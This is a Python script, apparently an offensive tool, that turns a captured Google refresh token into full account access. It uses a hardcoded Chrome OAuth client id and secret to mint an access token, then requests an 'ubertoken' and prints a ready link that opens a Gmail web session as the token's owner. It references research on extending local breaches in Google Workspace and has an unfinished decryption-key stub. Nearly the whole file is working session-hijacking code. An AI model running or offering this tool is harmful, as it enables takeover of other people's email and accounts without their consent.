'''
// Call refreshToken which creates a new Access Token
access_token = refreshToken(client_id, client_secret, refresh_token)

// Pass the new Access Token to Credentials() to create new credentials
credentials = google.oauth2.credentials.Credentials(access_token)

// This function creates a new Access Token using the Refresh Token
// and also refreshes the ID Token (see comment below).
'''
import argparse
import sys
import requests

def refreshToken(client_id, client_secret, refresh_token):
    params = {
            "grant_type": "refresh_token",
            "client_id": client_id,
            "client_secret": client_secret,
            "refresh_token": refresh_token
    }

    authorization_url = "https://oauth2.googleapis.com/token"

    r = requests.post(authorization_url, data=params)

    if r.ok:
            return r.json()['access_token']
    else:
            return None

def get_token_info(id_token):
    endpoint = "https://oauth2.googleapis.com/tokeninfo?id_token={}"
    r = requests.get(endpoint.format(id_token))
    debugprint("[-] Raw response: {}".format(r.text))
    if r.ok:
        print("[+] Get valid access_token for {}\n".format(r.json()['email']))
    else:
        print("[x] Error")
        debugprint(r.text)

def refreshToken2(client_id, client_secret, refresh_token):
    params = {
            "grant_type": "refresh_token",
            "client_id": client_id,
            "client_secret": client_secret,
            "refresh_token": refresh_token
    }

    authorization_url = "https://www.googleapis.com/oauth2/v4/token"

    r = requests.post(authorization_url, data=params)
    debugprint("[-] Raw response: {}".format(r.text))
    if r.ok:
            debugprint(f"[-] access_token: {r.json()['access_token']}")
            debugprint(f"[-] scope: {r.json()['scope']}")
            debugprint(f"[-] id_token: {r.json()['id_token']}")
            get_token_info(r.json()['id_token'])
            return r.json()['access_token']
    else:
            return None

def get_decryption_key():
    #https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/<resource_id >
    #Todo
    #https://www.bitdefender.com/blog/businessinsights/the-chain-reaction-new-methods-for-extending-local-breaches-in-google-workspace/
    return 1

def get_ubertoken(access_token):
    # https://gist.github.com/arirubinstein/fd5453537436a8757266f908c3e41538#code
    endpoint = "https://www.google.com/accounts/OAuthLogin?source=ChromiumBrowser&issueuberauth=1"
    target = "https://accounts.google.com/TokenAuth?auth={}&service=mail&continue=http://mail.google.com/mail"
    headers = {"Authorization": "Bearer {}".format(access_token)}
    r = requests.get(endpoint, headers=headers)
    if r.ok:
        return target.format(r.text)
    else:
        debugprint("[x] Error when requesting ubertoken")
        debugprint(r.text)
        return None


def main():

    parser = argparse.ArgumentParser(add_help = True, description = "Get Google Service Token")

    parser.add_argument('-d','--debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t', '--token', help='token')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    global debugprint
    debugprint = print if options.debug else lambda *a, **k: None

    client_id = '77185425430.apps.googleusercontent.com'
    client_secret = 'OTJgUOQcT7lO7GsGZq2G4IlT'
    refresh_token = options.token
    access_token = refreshToken2(client_id, client_secret, refresh_token)
    print(f'[+] Access_token: {access_token}\n')
    ubertoken = get_ubertoken(access_token)
    print(f'[+] Click on this link to get a websession for this user: {ubertoken}\n')
    return access_token


if __name__ == "__main__":
    main()
